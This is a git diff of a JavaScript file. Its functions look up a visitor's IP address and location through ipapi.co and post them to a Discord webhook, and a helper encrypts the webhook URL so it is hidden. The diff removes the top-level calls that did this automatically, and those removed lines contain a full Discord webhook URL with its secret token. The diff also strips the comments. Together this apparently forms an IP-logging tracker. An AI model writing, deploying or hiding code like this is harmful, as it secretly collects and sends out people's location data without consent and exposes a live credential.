@@ -1,6 +1,6 @@
 async function encryptWebhook(webhook) {
-    const keyBytes = crypto.getRandomValues(new Uint8Array(32)); // 256-bit AES key
-    const iv = crypto.getRandomValues(new Uint8Array(16)); // 128-bit IV
+    const keyBytes = crypto.getRandomValues(new Uint8Array(32));
+    const iv = crypto.getRandomValues(new Uint8Array(16));
 
     const encoder = new TextEncoder();
     const data = encoder.encode(webhook);
@@ -26,17 +26,10 @@ async function encryptWebhook(webhook) {
     return {
         ciphertext: encryptedBase64,
         iv: ivBase64,
-        key: btoa(String.fromCharCode(...keyBytes)) // For demonstration only
+        key: btoa(String.fromCharCode(...keyBytes))
     };
 }
 
-console.log("Script is running...");
-encryptWebhook("https://discord.com/api/webhooks/1384868336583708692/XcCOUDJijO6fENYdsFwJL0-lH6rCxBAK7RfgtS6BsfNKjsp-sykaF66n5PcjKAaDouiU")
-    .then(result => console.log(result));
-
-
-
-// send webhook to discord
 
 async function getIpAndLocation() {
     const res = await fetch('https://ipapi.co/json/');
@@ -57,14 +50,3 @@ async function sendWebhook(webhookUrl, data) {
     }
     return await response.json();
 }
-
-getIpAndLocation()
-    .then(info => {
-        const content = `IP: ${info.ip}\nCity: ${info.city}\nRegion: ${info.region}\nCountry: ${info.country_name}`;
-        return sendWebhook(
-            "https://discord.com/api/webhooks/1384868336583708692/XcCOUDJijO6fENYdsFwJL0-lH6rCxBAK7RfgtS6BsfNKjsp-sykaF66n5PcjKAaDouiU",
-            { content }
-        );
-    })
-    .then(response => console.log("Webhook sent successfully:", response))
-    .catch(error => console.error("Error:", error));
